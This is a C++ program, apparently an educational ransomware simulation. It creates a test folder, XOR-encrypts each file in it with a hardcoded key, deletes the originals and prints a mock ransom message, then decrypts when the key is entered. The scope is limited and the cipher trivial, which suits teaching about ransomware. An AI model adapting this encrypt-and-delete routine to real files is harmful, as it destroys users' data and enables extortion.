#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>


const std::string TEST_FOLDER = "testfolder";
const char XOR_KEY = 'K'; // Simple XOR key for encryption/decryption

// Function to create a test file with sample content
void createTestFile() {
    std::ofstream file(TEST_FOLDER + "/test.txt");
    if (file.is_open()) {
        file << "This is a test file for cybersecurity education.\n";
        file << "It will be encrypted to simulate ransomware behavior.\n";
        file.close();
        std::cout << "Test file created in folder: " << TEST_FOLDER << std::endl;
    } else {
        std::cerr << "Error creating test file!" << std::endl;
        exit(1);
    }
}

// Function to perform XOR encryption/decryption on a file
void processFile(const std::string& inputFile, const std::string& outputFile, char key) {
    std::ifstream inFile(inputFile, std::ios::binary);
    std::ofstream outFile(outputFile, std::ios::binary);

    if (!inFile.is_open() || !outFile.is_open()) {
        std::cerr << "Error opening files!" << std::endl;
        exit(1);
    }

    char c;
    while (inFile.get(c)) {
        outFile.put(c ^ key); // XOR each byte with the key
    }

    inFile.close();
    outFile.close();
    std::cout << "File processed: " << outputFile << std::endl;
}

// Function to process all files in a folder
void processFolder(const std::string& folderPath, char key, bool encrypt) {
    for (const auto& entry : std::filesystem::directory_iterator(folderPath)) {
        if (entry.is_regular_file()) {
            std::string inputFile = entry.path().string();
            std::string outputFile = encrypt ? (inputFile + ".encrypted") : inputFile.substr(0, inputFile.find(".encrypted"));
            
            processFile(inputFile, outputFile, key);

            if (encrypt) {
                remove(inputFile.c_str()); // Remove original file after encryption
            } else {
                remove(entry.path().string().c_str()); // Remove encrypted file after decryption
            }
        }
    }
}

// Simulate ransomware behavior
void simulateRansomware() {
    std::cout << "[SIMULATED RANSOMWARE] Your files in folder (" << TEST_FOLDER << ") have been encrypted!\n";
    std::cout << "This is a controlled test for educational purposes.\n";
    std::cout << "To decrypt, run the program again and enter the correct key.\n";
}

// Main function
int main() {
    // Ensure we're in a safe, isolated directory (e.g., current working directory)
    std::string workDir = std::filesystem::current_path().string();
    std::cout << "Working in directory: " << workDir << std::endl;

    // Step 1: Create the test folder and a test file if the folder doesn't exist
    if (!std::filesystem::exists(TEST_FOLDER)) {
        std::filesystem::create_directory(TEST_FOLDER);
        createTestFile();
    }

    // Step 2: Check if the folder contains encrypted files
    bool hasEncryptedFiles = false;
    for (const auto& entry : std::filesystem::directory_iterator(TEST_FOLDER)) {
        if (entry.path().string().find(".encrypted") != std::string::npos) {
            hasEncryptedFiles = true;
            break;
        }
    }

    if (hasEncryptedFiles) {
        std::cout << "Encrypted files detected. Attempting decryption...\n";
        std::string userKey;
        std::cout << "Enter the decryption key: ";
        std::getline(std::cin, userKey);

        if (userKey.length() == 1 && userKey[0] == XOR_KEY) {
            processFolder(TEST_FOLDER, XOR_KEY, false);
            std::cout << "Files decrypted successfully!\n";
        } else {
            std::cout << "Incorrect key! Decryption failed.\n";
        }
    } else {
        // Step 3: Encrypt all files in the folder
        processFolder(TEST_FOLDER, XOR_KEY, true);
        simulateRansomware();
    }

    return 0;
}